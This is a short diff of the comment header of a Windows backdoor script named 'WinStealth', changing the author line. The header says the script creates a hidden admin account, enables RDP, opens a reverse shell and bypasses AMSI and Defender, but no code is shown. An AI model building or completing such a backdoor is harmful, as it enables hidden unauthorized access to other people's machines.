@@ -1,6 +1,5 @@
 # WinStealth - Persistent Service Backdoor for Windows
-# Author: [Your Name]
-# Email: [Your Email]
+# Author: Phil Cali
 # Description: Creates a hidden admin account, enables RDP, and sets up a reverse shell.
 
 # AMSI Bypass (Windows Defender Bypass)
